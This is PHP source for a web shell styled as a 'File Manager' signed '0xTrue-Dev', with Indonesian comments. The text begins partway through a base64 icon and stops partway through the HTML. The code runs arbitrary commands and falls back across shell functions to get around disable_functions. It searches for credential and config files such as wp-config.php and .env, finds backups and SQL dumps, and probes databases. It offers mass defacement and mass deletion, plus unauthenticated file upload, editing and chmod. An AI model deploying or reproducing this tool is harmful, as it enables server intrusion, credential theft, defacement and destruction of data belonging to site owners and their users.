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";

// --- Fungsi Bantuan ---
function getFileSize($bytes)
{
    if ($bytes === false || $bytes < 0) return 'N/A';
    if ($bytes === 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $index = floor(log($bytes, 1024));
    return round($bytes / (1024 ** $index), 2) . ' ' . $units[$index];
}

function executeCommand($cmd)
{
    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));

    if (!in_array('shell_exec', $disabled)) {
        return @shell_exec($cmd . ' 2>&1');
    }
    if (!in_array('exec', $disabled)) {
        @exec($cmd, $o);
        return implode("\n", $o);
    }
    if (!in_array('system', $disabled)) {
        ob_start();
        @system($cmd);
        return ob_get_clean();
    }
    if (!in_array('passthru', $disabled)) {
        ob_start();
        @passthru($cmd);
        return ob_get_clean();
    }
    if (!in_array('popen', $disabled)) {
        $p = @popen($cmd . ' 2>&1', 'r');
        if ($p) {
            $o = '';
            while (!feof($p)) $o .= fread($p, 1024);
            pclose($p);
            return $o;
        }
    }
    return 'Execution failed: All available command execution functions are disabled.';
}

function getFilePermissions($file)
{
    if (!file_exists($file)) return '---------';
    $perms = @fileperms($file);
    if ($perms === false) return '---------';
    $info = '';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function getFileOwner($file)
{
    if (!file_exists($file)) return '?';
    $ownerId = @fileowner($file);
    if ($ownerId === false) return '?';
    if (is_callable('posix_getpwuid')) {
        $ownerInfo = @posix_getpwuid($ownerId);
        return $ownerInfo ? $ownerInfo['name'] : $ownerId;
    }
    return $ownerId;
}

function getFileGroup($file)
{
    if (!file_exists($file)) return '?';
    $groupId = @filegroup($file);
    if ($groupId === false) return '?';
    if (is_callable('posix_getgrgid')) {
        $groupInfo = @posix_getgrgid($groupId);
        return $groupInfo ? $groupInfo['name'] : $groupId;
    }
    return $groupId;
}

function deleteDirectory($dirPath)
{
    if (!is_dir($dirPath)) return ['success' => false, 'message' => 'Path is not a directory.'];
    try {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dirPath, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
        foreach ($files as $fileinfo) {
            $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
            if (!@$todo($fileinfo->getRealPath())) return ['success' => false, 'message' => "Failed to delete {$fileinfo->getRealPath()}. Check permissions."];
        }
        if (@rmdir($dirPath)) return ['success' => true, 'message' => 'Directory deleted successfully.'];
        return ['success' => false, 'message' => 'Failed to delete the main directory.'];
    } catch (Exception $e) {
        return ['success' => false, 'message' => 'An error occurred: ' . $e->getMessage()];
    }
}

// --- Inisialisasi Variabel ---
$nick = "0xTrue-Dev";
$path = getcwd();
if (isset($_GET['path']) && !empty($_GET['path'])) {
    $tempPath = realpath($_GET['path']);
    if ($tempPath !== false && is_dir($tempPath)) {
        $path = $tempPath;
    }
}
$path = str_replace('\\', '/', $path);

// --- Penanganan Aksi (POST & AJAX) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    // =================================================
    // Penanganan Aksi AJAX (Return JSON)
    // =================================================
    $ajax_actions = ['executeCommand', 'findConfigs', 'findBackups', 'connectDb'];
    if (in_array($action, $ajax_actions)) {
        header('Content-Type: application/json');
        $response = ['success' => false, 'output' => 'Invalid AJAX action.'];

        switch ($action) {
            case 'executeCommand':
                if (isset($_POST['command'])) {
                    $output = executeCommand('cd ' . escapeshellarg($path) . ' && ' . $_POST['command']);
                    $response = ['success' => true, 'output' => trim($output)];
                } else {
                    $response['output'] = 'No command provided.';
                }
                break;

            case 'findConfigs':
                if (!empty($_POST['searchDir'])) {
                    $searchDir = realpath($_POST['searchDir']);
                    if ($searchDir && is_dir($searchDir)) {
                        $config_patterns = [
                            '*.config.php',
                            '*.inc.php',
                            '*.ini',
                            'config*.php',
                            'wp-config.php',
                            'settings.php',
                            'database.php',
                            '.env',
                            'config.json',
                            'credentials.json'
                        ];
                        $found_files = [];
                        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($searchDir, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                        foreach ($iterator as $file) {
                            if ($file->isFile()) {
                                foreach ($config_patterns as $pattern) {
                                    if (fnmatch($pattern, $file->getBasename())) {
                                        $found_files[] = $file->getRealPath();
                                        break;
                                    }
                                }
                            }
                        }
                        $response = ['success' => true, 'output' => !empty($found_files) ? implode("\n", $found_files) : 'No config files found.'];
                    } else {
                        $response['output'] = 'Search directory not found.';
                    }
                } else {
                    $response['output'] = 'Invalid request.';
                }
                break;

            case 'findBackups':
                if (!empty($_POST['searchDir'])) {
                    $searchDir = realpath($_POST['searchDir']);
                    if ($searchDir && is_dir($searchDir)) {
                        $backup_patterns = [
                            '*.bak',
                            '*.backup',
                            '*.old',
                            '*.zip',
                            '*.tar.gz',
                            '*.sql',
                            '*_backup.*'
                        ];
                        $found_files = [];
                        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($searchDir, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                        foreach ($iterator as $file) {
                            if ($file->isFile()) {
                                foreach ($backup_patterns as $pattern) {
                                    if (fnmatch($pattern, $file->getBasename())) {
                                        $found_files[] = $file->getRealPath();
                                        break;
                                    }
                                }
                            }
                        }
                        $response = ['success' => true, 'output' => !empty($found_files) ? implode("\n", $found_files) : 'No backup files found.'];
                    } else {
                        $response['output'] = 'Search directory not found.';
                    }
                } else {
                    $response['output'] = 'Invalid request.';
                }
                break;

            case 'connectDb':
                if (extension_loaded('mysqli')) {
                    $db_host = $_POST['db_host'] ?? '';
                    $db_user = $_POST['db_user'] ?? '';
                    $db_pass = $_POST['db_pass'] ?? '';
                    $db_name = $_POST['db_name'] ?? '';
                    $conn = @new mysqli($db_host, $db_user, $db_pass, $db_name);
                    if ($conn->connect_error) {
                        $response['output'] = "Connection failed: " . $conn->connect_error;
                    } else {
                        $result = $conn->query('SHOW TABLES');
                        $tables = [];
                        if ($result) {
                            while ($row = $result->fetch_array()) {
                                $tables[] = $row[0];
                            }
                        }
                        $conn->close();
                        $output = "Connection successful!\n\nDatabase: {$db_name}\nTables: " . (empty($tables) ? 'No tables found.' : implode(", ", $tables));
                        $response = ['success' => true, 'output' => $output];
                    }
                } else {
                    $response['output'] = 'MySQLi extension is not loaded.';
                }
                break;
        }

        echo json_encode($response);
        exit;
    }

    // =================================================
    // Penanganan Aksi Form Tradisional (Redirect)
    // =================================================
    $result = ['success' => false, 'message' => 'Unknown action.'];
    $redirect_path = urlencode($path);

    switch ($action) {
        case 'upload':
            if (isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK) {
                if (move_uploaded_file($_FILES['file']['tmp_name'], $path . '/' . basename($_FILES['file']['name']))) {
                    $result = ['success' => true, 'message' => 'File uploaded successfully.'];
                } else {
                    $result['message'] = 'Upload failed. Check permissions.';
                }
            } else {
                $result['message'] = 'Upload error: ' . ($_FILES['file']['error'] ?? 'Unknown');
            }
            break;

        case 'createFile':
            if (!empty($_POST['fileName'])) {
                if (file_put_contents($path . '/' . basename($_POST['fileName']), $_POST['content'] ?? '') !== false) {
                    $result = ['success' => true, 'message' => 'File created successfully.'];
                } else {
                    $result['message'] = 'Failed to create file.';
                }
            } else {
                $result['message'] = 'File name is empty.';
            }
            break;

        case 'saveFile':
            if (!empty($_POST['filePath']) && isset($_POST['content'])) {
                $filePath = realpath($_POST['filePath']);
                if ($filePath && is_writable($filePath)) {
                    if (file_put_contents($filePath, $_POST['content']) !== false) {
                        $result = ['success' => true, 'message' => 'File saved successfully.'];
                    } else {
                        $result['message'] = 'Failed to save file.';
                    }
                } else {
                    $result['message'] = 'File is not writable or does not exist.';
                }
                $redirect_path = urlencode(dirname($filePath));
            } else {
                $result['message'] = 'Invalid request.';
            }
            break;

        case 'createFolder':
            if (!empty($_POST['folderName'])) {
                if (mkdir($path . '/' . basename($_POST['folderName']), 0755)) {
                    $result = ['success' => true, 'message' => 'Folder created successfully.'];
                } else {
                    $result['message'] = 'Failed to create folder.';
                }
            } else {
                $result['message'] = 'Folder name is empty.';
            }
            break;

        case 'rename':
            if (!empty($_POST['path']) && !empty($_POST['newName'])) {
                $oldPath = realpath($_POST['path']);
                if ($oldPath) {
                    $newPath = dirname($oldPath) . '/' . basename($_POST['newName']);
                    $redirect_path = urlencode(dirname($newPath));
                    if (rename($oldPath, $newPath)) {
                        $result = ['success' => true, 'message' => 'Renamed successfully.'];
                    } else {
                        $result['message'] = 'Failed to rename.';
                    }
                } else {
                    $result['message'] = 'Item not found.';
                }
            } else {
                $result['message'] = 'Invalid request.';
            }
            break;

        case 'delete':
            if (!empty($_POST['path'])) {
                $itemPath = realpath($_POST['path']);
                if ($itemPath) {
                    $redirect_path = urlencode(dirname($itemPath));
                    if ($_POST['type'] === 'dir') {
                        $result = deleteDirectory($itemPath);
                    } else {
                        if (unlink($itemPath)) {
                            $result = ['success' => true, 'message' => 'File deleted successfully.'];
                        } else {
                            $result['message'] = 'Failed to delete file.';
                        }
                    }
                } else {
                    $result['message'] = 'Item not found.';
                }
            } else {
                $result['message'] = 'Invalid request.';
            }
            break;

        case 'changePermissions':
            if (!empty($_POST['path']) && !empty($_POST['permissions'])) {
                if (chmod(realpath($_POST['path']), octdec($_POST['permissions']))) {
                    $result = ['success' => true, 'message' => 'Permissions changed successfully.'];
                } else {
                    $result['message'] = 'Failed to change permissions.';
                }
            } else {
                $result['message'] = 'Invalid request.';
            }
            break;

        case 'massDeface':
            if (!empty($_POST['targetDir']) && !empty($_POST['fileName']) && isset($_POST['content'])) {
                $targetDir = realpath($_POST['targetDir']);
                $fileName = basename($_POST['fileName']);
                $content = $_POST['content'];
                $recursive = isset($_POST['recursive']);
                $count = 0;
                if ($targetDir && is_dir($targetDir)) {
                    if (file_put_contents($targetDir . '/' . $fileName, $content) !== false) {
                        $count++;
                    }
                    if ($recursive) {
                        $directories = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($targetDir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                        foreach ($directories as $info) {
                            if ($info->isDir()) {
                                if (file_put_contents($info->getRealPath() . '/' . $fileName, $content) !== false) {
                                    $count++;
                                }
                            }
                        }
                    }
                    $result = ['success' => true, 'message' => "Mass deface complete. {$count} files created/modified."];
                } else {
                    $result['message'] = 'Target directory not found or is not a directory.';
                }
            } else {
                $result['message'] = 'Invalid request for mass deface.';
            }
            break;

        case 'massDelete':
            if (!empty($_POST['targetDir']) && !empty($_POST['fileName'])) {
                $targetDir = realpath($_POST['targetDir']);
                $fileNamePattern = $_POST['fileName'];
                $recursive = isset($_POST['recursive']);
                $count = 0;
                if ($targetDir && is_dir($targetDir)) {
                    $iterator = $recursive ? new RecursiveIteratorIterator(new RecursiveDirectoryIterator($targetDir, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST) : new IteratorIterator(new DirectoryIterator($targetDir));
                    foreach ($iterator as $file) {
                        if ($file->isFile() && fnmatch($fileNamePattern, $file->getBasename())) {
                            if (unlink($file->getRealPath())) {
                                $count++;
                            }
                        }
                    }
                    $result = ['success' => true, 'message' => "Mass delete complete. {$count} files deleted."];
                } else {
                    $result['message'] = 'Target directory not found.';
                }
            } else {
                $result['message'] = 'Invalid request for mass delete.';
            }
            break;
    }

    $status_key = $result['success'] ? 'success' : 'error';
    header("Location: ?path={$redirect_path}&{$status_key}=1&message=" . urlencode($result['message']));
    exit;
}

// --- Penanganan AJAX untuk view file (dan fallback untuk direct access) ---
if (isset($_GET['filesrc'])) {
    $filepath = realpath($_GET['filesrc']);
    if ($filepath && is_file($filepath) && is_readable($filepath)) {
        header('Content-Type: text/plain; charset=UTF-8');
        readfile($filepath);
    } else {
        header('HTTP/1.0 404 Not Found');
        echo '404 Not Found. File may not exist or is not readable.';
    }
    exit;
}

// --- Data untuk Tampilan ---
$disk_total = @disk_total_space($path) ?: 1;
$disk_free = @disk_free_space($path) ?: 0;
$disk_used = $disk_total - $disk_free;
$disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) : 0;
?>
<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($nick); ?> - File Manager</title>
    <link rel="icon" href="<?php echo $imageIco; ?>" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        .table-hover tbody tr:hover {
            background-color: rgba(255, 255, 255, 0.075);
        }

        .breadcrumb-item a,
        .table a {
            text-decoration: none;
        }

        .btn-action {
            background: transparent;
            border: none;
            padding: 0.2rem 0.4rem;
        }

        .terminal {
            background-color: #000;
            font-family: 'Courier New', Courier, monospace;
            color: #0f0;
            height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
        }

        .code-editor {
            font-family: 'Courier New', Courier, monospace;
        }

        .word-break {
            word-break: break-all;
        }

        .view-content {
            max-height: 70vh;
            overflow-y: auto;
            background-color: #000;
        }
    </style>
</head>

<body>
    <div class="toast-container position-fixed top-0 end-0 p-3" style="z-index: 1100">
        <div id="notificationToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
            <div class="toast-header">
                <i id="toast-icon" class="fas fa-check-circle me-2"></i>
                <strong class="me-auto" id="toast-title"></strong>
                <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
            </div>
            <div class="toast-body" id="toast-body"></div>
        </div>
    </div>

    <div class="container my-4">
        <header class="text-center p-4 mb-4 bg-body-tertiary border rounded-3">
            <h1><i class="fas fa-ghost me-3"></i><?php echo htmlspecialchars($nick); ?> File Manager</h1>
        </header>

        <main>
            <div class="card bg-body-tertiary border mb-4">
                <div class="card-body">
                    <nav aria-label="breadcrumb">
                        <ol class="breadcrumb">
                            <li class="breadcrumb-item"><a href="?path=/"><i class="fas fa-home"></i></a></li>
                            <?php
                            $path_parts = explode('/', trim($path, '/'));
                            $cumulativePath = '';
                            foreach ($path_parts as $part) {
                                if (empty($part)) continue;
                                $cumulativePath .= '/' . $part;
                                echo '<li class="breadcrumb-item"><a href="?path=' . urlencode($cumulativePath) . '">' . htmlspecialchars($part) . '</a></li>';
                            }
                            ?>
                        </ol>
                    </nav>
                    <div class="d-flex flex-wrap gap-2">
                        <button class="btn btn-sm btn-primary" data-bs-toggle="modal" data-bs-target="#uploadModal"><i class="fas fa-upload me-1"></i>Upload</button>
                        <button class="btn btn-sm btn-success" data-bs-toggle="modal" data-bs-target="#newFileModal"><i class="fas fa-file me-1"></i>New File</button>
                        <button class="btn btn-sm btn-info" data-bs-toggle="modal" data-bs-target="#newFolderModal"><i class="fas fa-folder-plus me-1"></i>New Folder</button>
                        <button class="btn btn-danger" data-bs-toggle="modal" data-bs-target="#massToolsModal"><i class="fas fa-tools"></i> Mass Tools</button>
                        <button class="btn btn-sm btn-warning text-dark" data-bs-toggle="modal" data-bs-target="#commandModal"><i class="fas fa-terminal me-1"></i>Terminal</button>
                        <button class="btn btn-secondary" data-bs-toggle="modal" data-bs-target="#serverInfoModal"><i class="fas fa-info-circle"></i> Server Info</button>
                    </div>
                    <div class="mt-3">
                        <div class="d-flex justify-content-between small">
                            <span>Disk Usage</span><span><?php echo $disk_used_percent; ?>%</span>
                        </div>
                        <div class="progress" style="height: 5px;">
                            <div class="progress-bar" role="progressbar" style="width: <?php echo $disk_used_percent; ?>%;"></div>
                        </div>
                        <div class="d-flex justify-content-between small text-muted mt-1">
                            <span><?php echo getFileSize($disk_used); ?> of <?php echo getFileSize($disk_total); ?></span>
                            <span>Free: <?php echo getFileSize($disk_free); ?></span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="table-responsive">
                <table class="table table-dark table-hover table-sm align-middle">
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th class="text-end">Size</th>
                            <th class="text-center">Permissions</th>
                            <th>Owner/Group</th>
                            <th>Modified</th>
                            <th class="text-center">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (realpath($path) !== realpath($_SERVER['DOCUMENT_ROOT']) && $path !== '/'): ?>
                            <tr>
                                <td><i class="fas fa-level-up-alt text-warning me-2"></i><a href="?path=<?php echo urlencode(dirname($path)); ?>">[..]</a></td>
                                <td colspan="5"></td>
                            </tr>
                        <?php endif;
                        $items = @scandir($path);
                        if ($items !== false) {
                            $dirs = [];
                            $files = [];
                            foreach (array_diff($items, ['.', '..']) as $item) {
                                if (is_dir("$path/$item")) $dirs[] = $item;
                                else $files[] = $item;
                            }
                            natcasesort($dirs);
                            natcasesort($files);
                            foreach (array_merge($dirs, $files) as $item) {
                                $fullPath = "$path/$item";
                                $isDir = is_dir($fullPath);
                                $icon = $isDir ? 'fa-folder text-warning' : 'fa-file-alt text-light';
                                echo '<tr>
                                <td class="word-break"><i class="fas ' . $icon . ' me-2"></i><a href="?' . ($isDir ? 'path=' . urlencode($fullPath) : 'filesrc=' . urlencode($fullPath)) . '" ' . (!$isDir ? 'target="_blank"' : '') . '>' . htmlspecialchars($item) . '</a></td>
                                <td class="text-end">' . ($isDir ? '-' : getFileSize(@filesize($fullPath))) . '</td>
                                <td class="text-center"><small>' . getFilePermissions($fullPath) . '</small></td>
                                <td><small>' . getFileOwner($fullPath) . '/' . getFileGroup($fullPath) . '</small></td>
                                <td><small>' . date('Y-m-d H:i', @filemtime($fullPath)) . '</small></td>
                                <td class="text-center">
                                    <div class="btn-group btn-group-sm">';
                                if (!$isDir) {
                                    echo '<button class="btn-action text-primary" data-bs-toggle="modal" data-bs-target="#viewFileModal" data-path="' . htmlspecialchars($fullPath) . '" data-name="' . htmlspecialchars($item) . '"><i class="fas fa-eye"></i></button>';
                                    echo '<button class="btn-action text-info" data-bs-toggle="modal" data-bs-target="#editFileModal" data-path="' . htmlspecialchars($fullPath) . '" data-name="' . htmlspecialchars($item) . '"><i class="fas fa-edit"></i></button>';
                                }
                                echo '<button class="btn-action text-warning" data-bs-toggle="modal" data-bs-target="#renameModal" data-path="' . htmlspecialchars($fullPath) . '" data-name="' . htmlspecialchars($item) . '"><i class="fas fa-i-cursor"></i></button>
                                  <button class="btn-action text-secondary" data-bs-toggle="modal" data-bs-target="#permsModal" data-path="' . htmlspecialchars($fullPath) . '" data-perms="' . substr(sprintf('%o', fileperms($fullPath)), -4) . '"><i class="fas fa-lock"></i></button>
                                  <button class="btn-action text-danger" data-bs-toggle="modal" data-bs-target="#deleteModal" data-path="' . htmlspecialchars($fullPath) . '" data-type="' . ($isDir ? 'dir' : 'file') . '" data-name="' . htmlspecialchars($item) . '"><i class="fas fa-trash"></i></button>
                                  </div></td></tr>';
                            }
                        } else {
                            echo '<tr><td colspan="6" class="text-center text-danger">Cannot read directory.</td></tr>';
                        } ?>
                    </tbody>
                </table>
            </div>
        </main>
        <footer class="text-center text-muted small mt-4">© <?php echo date('Y'); ?> <?php echo htmlspecialchars($nick); ?></footer>
    </div>

    <!-- MODALS -->
    <!-- View File -->
    <div class="modal fade" id="viewFileModal" tabindex="-1">
        <div class="modal-dialog modal-xl">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-eye me-2"></i>View File: <span id="viewFileName"></span></h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <pre id="viewFileContent" class="p-3 rounded view-content"></pre>
                </div>
            </div>
        </div>
    </div>

    <!-- Upload -->
    <div class="modal fade" id="uploadModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-upload me-2"></i>Upload File</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post" enctype="multipart/form-data">
                    <div class="modal-body"><input class="form-control" type="file" name="file" required></div>
                    <div class="modal-footer"><input type="hidden" name="action" value="upload"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-primary">Upload</button></div>
                </form>
            </div>
        </div>
    </div>

    <!-- New File -->
    <div class="modal fade" id="newFileModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-file-plus me-2"></i>New File</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <div class="mb-3"><label class="form-label">File Name</label><input type="text" name="fileName" class="form-control" required></div>
                        <div><label class="form-label">Content</label><textarea name="content" rows="8" class="form-control code-editor"></textarea></div>
                    </div>
                    <div class="modal-footer"><input type="hidden" name="action" value="createFile"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-success">Create</button></div>
                </form>
            </div>
        </div>
    </div>

    <!-- New Folder -->
    <div class="modal fade" id="newFolderModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-folder-plus me-2"></i>New Folder</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
